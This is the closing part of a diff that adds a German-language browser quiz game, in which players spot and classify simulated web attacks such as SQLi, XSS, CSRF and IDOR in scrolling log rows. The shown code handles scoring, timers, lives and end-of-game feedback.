+      },3000);
+    }
+  },cfg.interval);
+}
+
+function spawnRow(cfg){
+  var isAttack=(Math.random()<cfg.ratio);
+  var data, rowId="row"+rowCounter++;
+  if(isAttack){
+    data=ATTACKS[Math.floor(Math.random()*ATTACKS.length)];
+  } else {
+    data=NORMALS[Math.floor(Math.random()*NORMALS.length)];
+  }
+  var ip=IPS[Math.floor(Math.random()*IPS.length)];
+  var now=new Date();
+  var ts=pad(now.getHours())+":"+pad(now.getMinutes())+":"+pad(now.getSeconds());
+
+  var row=document.createElement("div");
+  row.className="log-row"+(isAttack?" malicious-hint":"");
+  row.id=rowId;
+
+  var methodClass=data.method==="GET"?"GET":"POST";
+  var statusClass=data.status.startsWith("2")?"s2xx":data.status.startsWith("3")?"s3xx":"s4xx";
+
+  var pathDisplay=isAttack&&data.display?data.display:escHtml(data.path);
+
+  row.innerHTML=
+    '<div class="log-cell lc-time">'+ts+'</div>'+
+    '<div class="log-cell lc-ip">'+ip+'</div>'+
+    '<div class="log-cell lc-method '+methodClass+'">'+data.method+'</div>'+
+    '<div class="log-cell lc-path">'+pathDisplay+'</div>'+
+    '<div class="log-cell lc-status '+statusClass+'">'+data.status+'</div>';
+
+  rowMap[rowId]={row:row, attack:isAttack?data:null, flagged:false, cfg:cfg};
+
+  row.onclick=function(){ handleRowClick(rowId); };
+
+  var list=document.getElementById("log-list");
+  list.appendChild(row);
+
+  // trim old rows
+  while(list.children.length>MAX_ROWS){
+    var oldest=list.children[0];
+    var oldId=oldest.id;
+    // check if it was an attack that was never flagged
+    if(rowMap[oldId]&&rowMap[oldId].attack&&!rowMap[oldId].flagged){
+      handleMissed(oldId);
+    }
+    if(rowMap[oldId]) delete rowMap[oldId];
+    list.removeChild(oldest);
+  }
+
+  // scroll to bottom
+  var scroll=document.getElementById("log-scroll");
+  scroll.scrollTop=scroll.scrollHeight;
+}
+
+function handleRowClick(rowId){
+  if(!gameRunning) return;
+  var entry=rowMap[rowId];
+  if(!entry||entry.flagged) return;
+
+  if(!entry.attack){
+    // FALSE POSITIVE
+    entry.flagged=true;
+    entry.row.classList.add("normal-flagged");
+    var chip=document.createElement("div");
+    chip.className="flag-chip chip-fp";chip.textContent="FALSE POS.";
+    entry.row.appendChild(chip);
+    score=Math.max(0,score-30);combo=1;statsFP++;
+    addEvent("fp","<b>False Positive!</b> Normaler Request geflaggt. -30 Punkte");
+    updateHUD();flash("red");
+    return;
+  }
+
+  // ATTACK – open modal
+  entry.flagged=true;
+  openModal(entry, rowId);
+}
+
+function openModal(entry, rowId){
+  if(currentModal) closeModal(false);
+  currentModal={entry:entry, rowId:rowId, answered:false};
+
+  var a=entry.attack;
+  var cfg=entry.cfg;
+
+  document.getElementById("modal-request").innerHTML=
+    '<span class="hl-key">Request:</span>\n'+escHtml(a.full);
+
+  // shuffle choices
+  var keys=["A","B","C","D"];
+  var chs=a.choices.slice();
+  var correct=chs[a.correct];
+  shuffleArr(chs);
+  var newCorrect=chs.indexOf(correct);
+
+  var choicesEl=document.getElementById("modal-choices");
+  choicesEl.innerHTML="";
+  chs.forEach(function(text,i){
+    var btn=document.createElement("button");
+    btn.className="mc-btn";
+    btn.innerHTML='<span class="mc-key">'+keys[i]+'</span>'+escHtml(text);
+    btn.onclick=function(){ answerModal(i, newCorrect, a, rowId); };
+    choicesEl.appendChild(btn);
+  });
+
+  document.getElementById("modal-overlay").classList.add("show");
+
+  // timer
+  var secs=cfg.timer, elapsed=0, interval=100;
+  document.getElementById("modal-timer-bar").style.width="100%";
+  document.getElementById("modal-timer-bar").style.background="var(--cyan)";
+  if(modalTimer) clearInterval(modalTimer);
+  modalTimer=setInterval(function(){
+    if(!currentModal||currentModal.answered) return;
+    elapsed+=interval;
+    var pct=Math.max(0,100-(elapsed/(secs*1000)*100));
+    document.getElementById("modal-timer-bar").style.width=pct+"%";
+    if(pct<30) document.getElementById("modal-timer-bar").style.background="var(--red)";
+    else if(pct<60) document.getElementById("modal-timer-bar").style.background="var(--yellow)";
+    if(elapsed>=secs*1000){
+      clearInterval(modalTimer);
+      // timeout = wrong
+      answerModal(-1, 0, a, rowId);
+    }
+  },interval);
+}
+
+function answerModal(chosen, correct, attack, rowId){
+  if(!currentModal||currentModal.answered) return;
+  currentModal.answered=true;
+  if(modalTimer){clearInterval(modalTimer);modalTimer=null;}
+
+  var btns=document.querySelectorAll(".mc-btn");
+  btns.forEach(function(b){b.disabled=true;});
+  btns[correct].classList.add("correct");
+
+  if(chosen===correct){
+    // correct
+    var timerBar=document.getElementById("modal-timer-bar");
+    var remaining=parseFloat(timerBar.style.width)||100;
+    var bonus=Math.round((remaining/100)*50);
+    var pts=100*combo+bonus;
+    score+=pts;
+    statsDetected++;
+    if(combo<5) combo++;
+    var entry=currentModal.entry;
+    entry.row.classList.remove("malicious-hint");
+    entry.row.classList.add("correct-flag");
+    var chip=document.createElement("div");
+    chip.className="flag-chip chip-ok";chip.textContent="BLOCKED";
+    entry.row.appendChild(chip);
+    addEvent("correct","<b>+"+pts+" Pkt</b> · "+escHtml(attack.label)+" erkannt!<br>"+attack.explanation);
+    flash("green");
+  } else {
+    // wrong or timeout
+    if(chosen>=0) btns[chosen].classList.add("wrong");
+    loseLife();
+    combo=1;
+    var entry2=currentModal.entry;
+    entry2.row.classList.remove("malicious-hint");
+    entry2.row.classList.add("wrong-flag");
+    addEvent("wrong",chosen===-1?
+      "<b>Zeit abgelaufen!</b> "+escHtml(attack.label)+"<br>"+attack.explanation:
+      "<b>Falsch!</b> Das war: "+escHtml(attack.label)+"<br>"+attack.explanation
+    );
+    flash("red");
+  }
+  updateHUD();
+  setTimeout(function(){ closeModal(false); },1400);
+}
+
+function closeModal(autoClose){
+  document.getElementById("modal-overlay").classList.remove("show");
+  currentModal=null;
+  if(modalTimer){clearInterval(modalTimer);modalTimer=null;}
+}
+
+function handleMissed(rowId){
+  var entry=rowMap[rowId];
+  if(!entry||entry.flagged) return;
+  entry.flagged=true;
+  entry.row.classList.remove("malicious-hint");
+  entry.row.classList.add("missed");
+  var chip=document.createElement("div");
+  chip.className="flag-chip chip-miss";chip.textContent="MISSED!";
+  entry.row.appendChild(chip);
+  loseLife();combo=1;statsMissed++;
+  addEvent("miss","<b>Angriff verpasst!</b> "+escHtml(entry.attack.label)+" ist durchgekommen.");
+  updateHUD();flash("red");
+}
+
+function loseLife(){
+  lives--;
+  if(lives<0) lives=0;
+  for(var i=1;i<=3;i++){
+    var h=document.getElementById("h"+i);
+    if(h) h.className="heart"+(i<=lives?"":" dead");
+  }
+  threatened=Math.min(100,threatened+20);
+  if(lives<=0&&gameRunning){ gameRunning=false; endGame(); }
+}
+
+function updateHUD(){
+  document.getElementById("hud-score").textContent=score;
+  var cb=document.getElementById("combo-badge");
+  cb.textContent="x"+combo;
+  cb.className=(combo>=3?"hot":"");
+  var tb=document.getElementById("threat-bar");
+  tb.style.width=threatened+"%";
+  tb.style.background=threatened>70?"var(--red)":threatened>40?"var(--yellow)":"var(--green)";
+}
+
+function addEvent(type,html){
+  var cls={correct:"ev-correct",wrong:"ev-wrong",miss:"ev-miss",fp:"ev-fp",sys:"ev-sys"}[type]||"ev-sys";
+  var d=document.createElement("div");
+  d.className="event-entry "+cls;
+  d.innerHTML=html;
+  var el=document.getElementById("event-log");
+  el.appendChild(d);
+  el.scrollTop=el.scrollHeight;
+  while(el.children.length>50) el.removeChild(el.children[0]);
+}
+
+function endGame(){
+  gameRunning=false;
+  if(spawnTimer){clearInterval(spawnTimer);spawnTimer=null;}
+  if(modalTimer){clearInterval(modalTimer);modalTimer=null;}
+  closeModal(false);
+
+  var total=statsDetected+statsMissed;
+  var acc=total>0?Math.round(statsDetected/total*100):0;
+  document.getElementById("es-score").textContent=score;
+  document.getElementById("es-detected").textContent=statsDetected;
+  document.getElementById("es-missed").textContent=statsMissed;
+  document.getElementById("es-fp").textContent=statsFP;
+  document.getElementById("es-acc").textContent=acc+"%";
+
+  var msg="",icon="🛡️",title="Einsatz beendet",sub="";
+  if(acc>=80&&statsFP<=2){
+    icon="🏆";title="Exzellenter Analyst!";sub="Höchste Bewertung";
+    msg="Beeindruckend – du erkennst Angriffsmuster sicher. SQLi, XSS, CSRF, IDOR: alles klar identifiziert. Klausur-ready!";
+  } else if(acc>=60){
+    icon="🎯";title="Guter Analyst";sub="Solide Leistung";
+    msg="Du erkennst die meisten Muster. Wiederhole XSS vs. CSRF vs. IDOR – da passieren die meisten Fehler.";
+  } else if(lives<=0){
+    icon="💀";title="System kompromittiert";sub="Alle Leben verloren";
+    msg="Zu viele Angriffe sind durchgekommen. Lies nochmal Kapitel 3 (SQLi), 4 (XSS) und 9 (CSRF) im Skript.";
+  } else {
+    icon="📚";title="Weiter üben!";sub="Noch Luft nach oben";
+    msg="Die Grundmuster sitzen noch nicht ganz. Achte besonders auf die URL-Parameter und HTTP-Header!";
+  }
+  document.getElementById("end-icon").textContent=icon;
+  document.getElementById("end-title").textContent=title;
+  document.getElementById("end-sub").textContent=sub;
+  document.getElementById("end-msg").textContent=msg;
+  document.getElementById("end-screen").style.display="flex";
+}
+
+// ─── UTILS ─────────────────────────────────────────────────────────────────
+function pad(n){return n<10?"0"+n:n;}
+function escHtml(s){
+  if(!s) return "";
+  return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
+}
+function shuffleArr(a){
+  for(var i=a.length-1;i>0;i--){
+    var j=Math.floor(Math.random()*(i+1));
+    var t=a[i];a[i]=a[j];a[j]=t;
+  }
+}
+function flash(color){
+  var el=document.getElementById("flash");
+  el.className="";
+  void el.offsetWidth; // reflow to restart CSS animation
+  el.className=color;
+}
+</script>
+</body>
+</html>
